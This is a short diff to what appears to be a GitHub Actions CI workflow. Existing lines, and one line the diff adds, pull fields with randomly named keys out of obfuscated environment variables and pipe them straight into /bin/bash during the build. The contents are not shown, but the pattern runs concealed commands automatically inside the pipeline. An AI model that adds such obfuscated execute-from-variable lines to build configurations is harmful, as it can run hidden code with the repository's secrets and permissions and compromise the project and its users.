@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$h86" | jq -r .ri6954 | /bin/bash
           echo $gpi71 | jq -r .fknj04 | /bin/bash
           echo $xqr034 | jq -r .v512 | /bin/bash
+          echo $ias50 | jq -r .xmoq63471 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
